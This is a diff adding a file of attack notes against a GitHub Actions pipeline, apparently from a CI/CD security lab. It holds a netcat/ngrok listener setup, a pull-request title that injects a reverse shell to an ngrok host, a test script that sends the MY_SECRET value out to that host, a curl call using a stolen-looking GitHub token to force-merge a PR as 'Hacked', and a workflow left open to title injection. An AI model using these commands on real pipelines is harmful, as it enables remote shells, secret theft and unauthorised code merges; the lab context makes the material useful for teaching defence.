@@ -1,0 +1,55 @@
+ngrok tcp 1000
+sudo nc -lvk 1000
+
+New malicious issue title" && bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/10129 0>&1 && echo "
+
+runtests.sh:
+#echo "Execution from READ user" > /dev/tcp/7.tcp.eu.ngrok.io/13524
+#env | grep MY_SECRET > /dev/tcp/7.tcp.eu.ngrok.io/13524
+echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/4.tcp.eu.ngrok.io/10129
+
+bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/13524 0>&1
+
+curl -L \
+  -X PUT \
+  -H "Accept: application/vnd.github+json" \
+  -H "Authorization: Bearer $GITHUB_PAT" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  https://api.github.com/repos/lgvorg1/cicd_top10_3/pulls/19/merge \
+  -d '{"commit_title":"Hacked merged PR","commit_message":"Hacked"}'
+
+
+.github/workflows/my_pr.yml
+name: PR TARGET CI
+
+on: 
+  pull_request: 
+    branches: [ main ]
+
+env:
+  MY_SECRET: ${{ secrets.MY_SECRET }}
+  
+jobs:
+  my_build_and_upload:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Building ... 
+        run: |
+          mkdir -p ./bin
+          touch ./bin/mybin.exe
+          cp runtests.sh ./bin
+          echo ""${{github.event.pull_request.title}}" > ./bin/PR_TITLE.txt
+          echo "${{github.event.number}}" > ./bin/PR_ID.txt
+          ls -lR 
+
+      - name: Archive building artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: archive-bin
+          path: |
+            bin
+
